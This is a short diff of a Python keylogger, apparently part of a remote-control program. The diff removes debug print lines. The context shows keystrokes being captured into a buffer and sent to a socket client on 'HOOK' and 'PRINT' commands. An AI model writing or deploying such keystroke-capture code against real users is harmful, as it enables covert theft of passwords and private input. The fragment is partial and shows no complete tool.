@@ -10,7 +10,6 @@ def on_press(key):
     global ishook, cont
     #cont = ""
     if ishook == 1:
-        print("t: ", cont)
         try:
             cont += str(key.char)
         except AttributeError:
@@ -21,7 +20,6 @@ def on_press(key):
 
 def send_cont(client, cont):
     #global cont
-    print("con:", cont)
     if cont == "":
         cont = "no input key"
     
@@ -50,9 +48,7 @@ def keylogger(client):
     cont = ""
     while True:
         msg = client.recv(BUFSIZE).decode("utf8")
-        print("zo:", msg)
         if (msg == "HOOK"):
-            print("zo22")
             if ishook == 0:
                 ishook = 1
                 keystroke()
@@ -60,7 +56,6 @@ def keylogger(client):
                 ishook = 0
                 listener.stop()  
         elif (msg == "PRINT"):
-            #print("sev:", cont)
             send_cont(client, cont)
             cont = ""
         elif (msg == "LOCK"):
